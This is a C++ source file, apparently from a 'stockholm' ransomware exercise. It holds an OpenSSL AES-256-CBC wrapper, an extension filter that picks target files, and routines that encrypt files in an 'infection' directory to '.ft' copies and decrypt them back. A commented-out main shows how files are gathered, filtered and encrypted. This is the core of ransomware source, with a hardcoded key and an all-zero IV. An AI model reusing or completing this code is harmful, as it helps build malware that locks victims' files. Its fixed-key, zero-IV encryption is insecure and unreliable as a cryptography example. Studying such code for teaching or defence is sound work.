#include "Crawler.hpp"
#include "stockholm.hpp"
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>

inline bool filter_extensions(std::string path)
{
	for (size_t i = 0; i < stockholm::extensions_count; ++i)
	{
		if (path.ends_with(stockholm::extensions[i]))
			return true;
	}
	return false;
}

//! TODO: Add mode selection encrypt/decrypt
//! TODO: Add better error handling
class AES_256_CBC
{

public:
	enum MODE
	{
		ENCRYPTION,
		DECRYPTION
	};
	AES_256_CBC(unsigned char *_key, unsigned char *_iv, MODE _mode)
	{
		memcpy(key, _key, sizeof(key));
		memcpy(iv, _iv, sizeof(iv));
		mode = _mode;
		init = false;
		error = false;
		ctx = EVP_CIPHER_CTX_new();
		cipher = EVP_aes_256_cbc();
		if (!ctx || !cipher)
		{
			ERR_print_errors_fp(stderr);
			EVP_CIPHER_CTX_free(ctx);
			return;
		}
	}

	~AES_256_CBC()
	{
		EVP_CIPHER_CTX_free(ctx);
	}

	AES_256_CBC &Init()
	{
		switch (mode)
		{
		case DECRYPTION:
			initDecryption();
			break;
		case ENCRYPTION:
			initEncryption();
			break;
		default:
			error = true;
			break;
		}
		return *this;
	}
	void Decrypt(unsigned char *in, int inl, unsigned char *out, int *outl)
	{
		if (mode != DECRYPTION)
			error = true;
		if (error)
			return;
		int outlen;
		if (!EVP_DecryptUpdate(ctx, out, outl, in, inl))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
	}

	void FinishDecryption(unsigned char *out, int *outl)
	{
		if (mode != DECRYPTION)
			error = true;
		if (error)
			return;
		int tmplen;
		if (!EVP_DecryptFinal_ex(ctx, (unsigned char *)((uintptr_t)out + *outl), &tmplen))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
		*outl += tmplen;
	}

	void Encrypt(unsigned char *in, int inl, unsigned char *out, int *outl)
	{
		if (mode != ENCRYPTION)
			error = true;
		if (error)
			return;
		if (!EVP_EncryptUpdate(ctx, out, outl, in, inl))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
	}

	void FinishEncryption(unsigned char *out, int *outl)
	{
		if (mode != ENCRYPTION)
			error = true;
		if (error)
			return;
		int tmplen;
		if (!EVP_EncryptFinal_ex(ctx, (unsigned char *)((uintptr_t)out + *outl), &tmplen))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
		*outl += tmplen;
	}

	void Decrypt()
	{
		if (mode != DECRYPTION)
			error = true;
		if (error)
			return;
	}

private:
	unsigned char key[32];
	unsigned char iv[16];
	bool error;
	bool init;
	EVP_CIPHER_CTX *ctx;
	const EVP_CIPHER *cipher;
	AES_256_CBC::MODE mode;

	void initEncryption()
	{
		if (!EVP_EncryptInit_ex2(ctx, cipher, key, iv, nullptr))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
	}

	void initDecryption()
	{
		if (!EVP_DecryptInit_ex2(ctx, cipher, key, iv, nullptr))
		{
			ERR_print_errors_fp(stderr);
			error = true;
			return;
		}
	}
};

void EncryptFile(fs::path p)
{
	fs::path enc_p;
	enc_p.assign(p);
	enc_p.replace_extension(std::string(p.extension()).append(".ft"));

	std::ifstream file(p, std::ios::in | std::ios::binary);
	std::ofstream enc_file(enc_p, std::ios::out | std::ios::binary | std::ios::trunc);
	if (!file.is_open())
	{
		std::cerr << "Failed to open file " << p << "." << std::endl;
		return;
	}
	if (!enc_file.is_open())
	{
		std::cerr << "Failed to open encrypted file " << p << "." << std::endl;
		return;
	}

	AES_256_CBC cipher = AES_256_CBC((uint8_t[]){0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31},
									 (uint8_t *)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
									 AES_256_CBC::ENCRYPTION);
	char in[1024];
	unsigned char out[1024 + EVP_MAX_BLOCK_LENGTH];
	int outl;
	cipher.Init();
	do
	{
		file.read(in, 1024);
		std::streamsize size = file.gcount();
		cipher.Encrypt((unsigned char *)in, (int)size, out, &outl);
		enc_file.write((char *)out, outl);
	} while (!file.eof());

	file.close();
	cipher.FinishEncryption(out, &outl);
	enc_file.write((char *)out, outl);
	enc_file.close();
}

void DecryptFile(fs::path p)
{
	fs::path dec_p;
	dec_p.assign(p);
	dec_p.replace_extension();

	std::ifstream file(p, std::ios::in | std::ios::binary);
	std::ofstream dec_file(dec_p, std::ios::out | std::ios::binary | std::ios::trunc);
	if (!file.is_open())
	{
		std::cerr << "Failed to open file " << p << "." << std::endl;
		return;
	}
	if (!dec_file.is_open())
	{
		std::cerr << "Failed to open decrypted file " << p << "." << std::endl;
		return;
	}

	AES_256_CBC cipher = AES_256_CBC((uint8_t[]){0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31},
									 (uint8_t *)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
									 AES_256_CBC::DECRYPTION);
	char in[1024];
	unsigned char out[1024 + EVP_MAX_BLOCK_LENGTH];
	int outl;
	cipher.Init();
	do
	{
		file.read(in, 1024);
		std::streamsize size = file.gcount();
		cipher.Decrypt((unsigned char *)in, (int)size, out, &outl);
		dec_file.write((char *)out, outl);
	} while (!file.eof());

	file.close();
	cipher.FinishDecryption(out, &outl);
	dec_file.write((char *)out, outl);
	dec_file.close();
}

// see https://docs.openssl.org/master/man3/EVP_EncryptInit/#examples

// int main(void)
// {
// 	// auto files = RetrieveFilesInInfectionDirectory();
// 	// std::list<std::string> filtered_files;
// 	// std::copy_if(files.begin(), files.end(), std::back_inserter(filtered_files), filter_extensions);
// 	// std::cout << filtered_files.size() << std::endl;
// 	// EncryptFile("/home/tblochet/infection/toto.txt");
// 	DecryptFile("/home/tblochet/infection/toto2.txt.ft");
// }
